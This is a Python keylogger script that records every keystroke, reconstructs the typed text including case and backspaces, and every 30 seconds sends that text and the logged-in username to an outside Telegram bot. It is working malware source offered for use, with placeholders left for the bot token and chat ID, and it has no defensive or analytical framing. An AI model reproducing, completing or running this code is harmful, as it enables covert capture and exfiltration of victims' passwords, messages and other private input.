import time as t
from pynput import keyboard as k
import requests
import datetime
import os
import shutil
import subprocess
import win32api
import win32con
import win32gui
import ctypes
from PIL import ImageGrab

# --- CONFIGURATION ---
BOT_API_TOKEN = "YOUR_BOT_TOKEN"  # <----------- CHANGE
USER_ID = "YOUR_USER_ID"  # <----------- CHANGE
LOG_INTERVAL = 30  # Log sending interval in seconds

# --- GLOBAL VARIABLES ---

# This will be our in-memory "text editor". Instead of a list of keys,
# we'll use a single string that we modify.
text_buffer = ""
# Variable to track the state of modifier keys
modifiers = {
    'shift': False,
    'ctrl': False,
    'alt': False,
    'caps_lock': False
}
log_start_time = datetime.datetime.now()

def send_telegram_message(body):
    """Sends the accumulated log via Telegram."""
    global log_start_time
    header = f"--- SESSION STARTED: {log_start_time.strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    context = f"OS: {os.name} | User: {os.getlogin()} \n"
    full_message = header + context + "--- LOG DATA ---\n" + body
    
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": full_message
        }
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Error sending message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")
    
    # Reset the log start time after sending
    log_start_time = datetime.datetime.now()

def on_press(key):
    """Handles key presses to build a readable log."""
    global text_buffer, modifiers

    try:
        # --- MODIFIER KEYS (Shift, Ctrl, Alt) ---
        # We update their state, but don't add them to the log directly.
        if key == k.Key.shift or key == k.Key.shift_r:
            modifiers['shift'] = True
            return # Do nothing else
        if key == k.Key.ctrl or key == k.Key.ctrl_l or key == k.Key.ctrl_r:
            modifiers['ctrl'] = True
            return
        if key == k.Key.alt or key == k.Key.alt_l or key == k.Key.alt_r:
            modifiers['alt'] = True
            return
        if key == k.Key.caps_lock:
            # Invert the caps_lock state
            modifiers['caps_lock'] = not modifiers['caps_lock']
            return

        # --- ACTION KEYS (Backspace, Enter, etc.) ---
        if key == k.Key.backspace:
            # If there is text, delete the last character
            if text_buffer:
                text_buffer = text_buffer[:-1]
            return
        if key == k.Key.enter:
            # Add a newline character
            text_buffer += '\n'
            return
        if key == k.Key.tab:
            # Add a tab character
            text_buffer += '\t'
            return
        if key == k.Key.space:
            # Add a real space character
            text_buffer += ' '
            return

        # --- ALPHANUMERIC CHARACTERS ---
        # If the key has a character (letters, numbers, symbols)
        if hasattr(key, 'char') and key.char is not None:
            char_to_add = key.char

            # Logic for uppercase/lowercase
            is_upper = False
            # If it's a letter and Shift is pressed, OR if Caps Lock is on (but not both)
            if char_to_add.isalpha():
                if (modifiers['shift'] and not modifiers['caps_lock']) or \
                   (not modifiers['shift'] and modifiers['caps_lock']):
                    is_upper = True
            
            # If it's a symbol and Shift is pressed
            if char_to_add in '1234567890-=[];\',./`' and modifiers['shift']:
                is_upper = True

            if is_upper:
                text_buffer += char_to_add.upper()
            else:
                text_buffer += char_to_add

    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key):
    """Clears the state of modifier keys when they are released."""
    if key == k.Key.shift or key == k.Key.shift_r:
        modifiers['shift'] = False
    if key == k.Key.ctrl or key == k.Key.ctrl_l or key == k.Key.ctrl_r:
        modifiers['ctrl'] = False
    if key == k.Key.alt or key == k.Key.alt_l or key == k.Key.alt_r:
        modifiers['alt'] = False

# --- START KEYLOGGER ---
# It's crucial to listen for both key presses and releases
# to properly manage modifier keys.
listener = k.Listener(on_press=on_press, on_release=on_release)
listener.start()
print("Keylogger started.") # Debug print

# --- MAIN LOOP ---
while True:
    t.sleep(LOG_INTERVAL)
    if text_buffer:
        # Send the content of the text buffer
        send_telegram_message(text_buffer)
        print(f"Data log sent:\n---\n{text_buffer}\n---") # Debug print
        # Clear the buffer to start logging anew
        text_buffer = ""
